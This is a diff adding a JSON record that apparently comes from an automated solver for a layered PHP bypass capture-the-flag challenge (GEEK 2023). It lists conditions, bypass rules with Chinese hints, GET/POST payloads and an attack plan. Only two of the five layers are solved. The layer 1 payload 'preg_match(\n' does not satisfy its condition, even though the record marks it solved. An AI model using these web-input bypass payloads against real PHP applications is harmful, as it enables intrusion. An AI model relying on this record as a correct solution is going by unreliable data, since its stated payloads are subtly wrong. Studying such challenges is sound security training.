@@ -1,0 +1,110 @@
+{
+  "type": "php_bypass",
+  "conditions": [
+    {
+      "layer": 1,
+      "condition_raw": "isset($_GET['syc'])&&preg_match('/^Welcome to GEEK 2023!$/i', $_GET['syc']) && $_GET['syc'] !== 'Welcome to GEEK 2023!'",
+      "params": [
+        "syc"
+      ],
+      "bypass_rule": "preg_match_dollar",
+      "bypass_desc": "preg_match $ anchor bypass (trailing newline)",
+      "bypass_hint": "末尾加换行符绕过 $ 锚点",
+      "solution_payloads": [
+        "preg_match(\n"
+      ],
+      "solved": true
+    },
+    {
+      "layer": 2,
+      "condition_raw": "intval($_GET['lover']) < 2023 && intval($_GET['lover'] + 1) > 2024",
+      "params": [
+        "lover"
+      ],
+      "bypass_rule": null,
+      "bypass_desc": null,
+      "bypass_hint": null,
+      "solution_payloads": [],
+      "solved": false
+    },
+    {
+      "layer": 3,
+      "condition_raw": "isset($_POST['qw']) && $_POST['yxx']",
+      "params": [
+        "yxx",
+        "qw"
+      ],
+      "bypass_rule": null,
+      "bypass_desc": null,
+      "bypass_hint": null,
+      "solution_payloads": [],
+      "solved": false
+    },
+    {
+      "layer": 4,
+      "condition_raw": "sha1($array1) === sha1($array2)",
+      "params": [],
+      "bypass_rule": null,
+      "bypass_desc": null,
+      "bypass_hint": null,
+      "solution_payloads": [],
+      "solved": false
+    },
+    {
+      "layer": 5,
+      "condition_raw": "isset($_POST['SYC_GEEK.2023'])&&($_POST['SYC_GEEK.2023'] = \"flag{test}\")",
+      "params": [
+        "SYC_GEEK.2023"
+      ],
+      "bypass_rule": "post_key_dot",
+      "bypass_desc": "POST key with dot bypass",
+      "bypass_hint": "PHP POST键名中 . 转 _ , 需用数组嵌套绕过",
+      "solution_payloads": [
+        "__BRACKET__:SYC_GEEK[2023]"
+      ],
+      "solved": true
+    }
+  ],
+  "total_layers": 5,
+  "solved_layers": 2,
+  "combined_payload": {
+    "get": {
+      "syc": "preg_match(\n"
+    },
+    "post": {
+      "SYC_GEEK[2023]": "Happy to see you!"
+    }
+  },
+  "attack_plan": [
+    {
+      "layer": 1,
+      "condition": "isset($_GET['syc'])&&preg_match('/^Welcome to GEEK 2023!$/i', $_GET['syc']) && $_GET['syc'] !== 'Wel",
+      "bypass": "末尾加换行符绕过 $ 锚点",
+      "payload": "preg_match(\n"
+    },
+    {
+      "layer": 2,
+      "condition": "intval($_GET['lover']) < 2023 && intval($_GET['lover'] + 1) > 2024",
+      "bypass": "⚠️ 未识别的条件类型",
+      "payload": null
+    },
+    {
+      "layer": 3,
+      "condition": "isset($_POST['qw']) && $_POST['yxx']",
+      "bypass": "⚠️ 未识别的条件类型",
+      "payload": null
+    },
+    {
+      "layer": 4,
+      "condition": "sha1($array1) === sha1($array2)",
+      "bypass": "⚠️ 未识别的条件类型",
+      "payload": null
+    },
+    {
+      "layer": 5,
+      "condition": "isset($_POST['SYC_GEEK.2023'])&&($_POST['SYC_GEEK.2023'] = \"flag{test}\")",
+      "bypass": "PHP POST键名中 . 转 _ , 需用数组嵌套绕过",
+      "payload": "__BRACKET__:SYC_GEEK[2023]"
+    }
+  ]
+}
